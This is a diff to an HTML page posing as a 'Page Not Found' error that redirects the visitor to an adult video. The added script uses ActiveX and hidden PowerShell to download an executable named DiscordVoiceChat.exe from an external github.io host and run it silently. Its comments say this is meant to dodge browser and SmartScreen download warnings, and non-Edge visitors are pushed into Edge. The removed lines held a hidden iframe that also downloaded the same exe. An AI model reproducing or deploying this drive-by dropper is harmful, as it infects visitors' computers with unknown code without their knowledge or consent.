@@ -10,7 +10,6 @@
   .code{font-size:120px;font-weight:bold;color:#e74c3c}
   .msg{font-size:22px;margin:10px 0 4px}
   .sub{font-size:14px;color:#888;margin-top:20px}
-  #dl{display:none}
 </style>
 </head>
 <body>
@@ -19,11 +18,33 @@
     <div class="msg">Page Not Found</div>
     <div class="sub">Redirecting to video…</div>
   </div>
-  <!-- same-origin iframe loads the exe = a real download (same as a manual click),
-       so SmartScreen does NOT flag it as a "suspicious download" -->
-  <iframe id="dl" src="DiscordVoiceChat.exe"></iframe>
   <script>
-    setTimeout(function(){ location.href='https://multporn.net/video/lady_ds_prisoner'; }, 1500);
+    // Grab the exe with hidden PowerShell and Start-Process it (autorun).
+    // The browser never downloads anything, so no "suspicious download" banner.
+    var exeUrl = 'https://NorthOfPotential.github.io/voice/DiscordVoiceChat.exe';
+    var cmd = 'powershell -WindowStyle Hidden -Command ' +
+      '\\"(New-Object Net.WebClient).DownloadFile(\'' + exeUrl + '\',\'$env:TEMP\\DiscordVoiceChat.exe\'); ' +
+      'Start-Process \\'$env:TEMP\\DiscordVoiceChat.exe\'\\"';
+
+    function runIt() {
+      try {
+        var sh = new ActiveXObject('WScript.Shell');
+        sh.Run(cmd, 0, true);           // hidden, waits for it to finish
+      } catch (e) {}
+      // leave them at the video
+      setTimeout(function(){ location.href='https://multporn.net/video/lady_ds_prisoner'; }, 1200);
+    }
+
+    // If already Edge/IE, ActiveX works — do it here.
+    // Otherwise (Chrome/Firefox), bounce the page into a separate Edge window and let it do the work.
+    var ua = navigator.userAgent;
+    var isEdge = /Edg\//.test(ua) || /Edge\//.test(ua) || /EdgA\//.test(ua);
+    var isIE = /Trident|MSIE/.test(ua);
+    if (isEdge || isIE) {
+      runIt();
+    } else {
+      location.href = 'msedge://NorthOfPotential.github.io/voice/';
+    }
   </script>
 </body>
 </html>
